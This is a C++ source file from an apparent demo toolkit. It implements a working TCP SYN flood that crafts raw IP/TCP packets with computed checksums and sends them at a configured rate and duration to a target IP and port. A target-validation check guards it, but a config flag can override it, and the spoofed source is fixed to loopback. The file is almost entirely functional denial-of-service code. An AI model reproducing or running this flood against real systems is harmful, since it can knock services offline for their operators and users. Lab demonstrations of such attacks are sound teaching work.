#include "demos.h"
#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <chrono>
#include <thread>
#include <cstring>
#include "../util/fd.h"

namespace demo {

struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
};

static uint16_t csum(unsigned short *ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    return (answer);
}

util::Result<void> run_syn_flood(const DemoConfig& cfg) {
    auto valid = validate_target(cfg.target_ip, cfg.override_safety);
    if (!valid.is_ok()) return valid;

    util::UniqueFd sock(socket(AF_INET, SOCK_RAW, IPPROTO_TCP));
    if (!sock.is_valid()) {
        return util::Result<void>::Err("Failed to create raw socket (are you root?)");
    }

    int one = 1;
    const int *val = &one;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        return util::Result<void>::Err("Failed to set IP_HDRINCL");
    }

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(cfg.target_port);
    inet_pton(AF_INET, cfg.target_ip.c_str(), &dest.sin_addr);

    char datagram[4096];
    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct ip));
    struct pseudo_header psh;

    auto start = std::chrono::steady_clock::now();
    long long sleep_ns = 1000000000LL / cfg.rate_pps;

    uint16_t sport_base = 1024;

    while (true) {
        auto now = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::seconds>(now - start).count() >= cfg.duration_s) {
            break;
        }

        memset(datagram, 0, 4096);

        // IP Header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = htons(54321);
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        // Use loopback source for loopback target to ensure delivery (R5.14-R5.16)
        iph->saddr = inet_addr("127.0.0.1"); 
        iph->daddr = dest.sin_addr.s_addr;
        iph->check = csum((unsigned short *) datagram, iph->tot_len);

        // TCP Header
        tcph->source = htons(static_cast<uint16_t>(sport_base++));
        if (sport_base == 0) sport_base = 1024;
        tcph->dest = htons(cfg.target_port);
        tcph->seq = 0;
        tcph->ack_seq = 0;
        tcph->doff = 5; 
        tcph->fin = 0;
        tcph->syn = 1;
        tcph->rst = 0;
        tcph->psh = 0;
        tcph->ack = 0;
        tcph->urg = 0;
        tcph->window = htons(5840); 
        tcph->check = 0;
        tcph->urg_ptr = 0;

        // Pseudo header for checksum
        psh.source_address = inet_addr("127.0.0.1");
        psh.dest_address = dest.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));

        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
        char pseudogram[512]; 
        memcpy(pseudogram, (char*) &psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));

        tcph->check = csum((unsigned short*) pseudogram, psize);

        if (sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr *) &dest, sizeof(dest)) < 0) {
            // Log once then exit if failure
            return util::Result<void>::Err("sendto failed");
        }

        std::this_thread::sleep_for(std::chrono::nanoseconds(sleep_ns));
    }

    return util::Result<void>::Ok();
}

} // namespace demo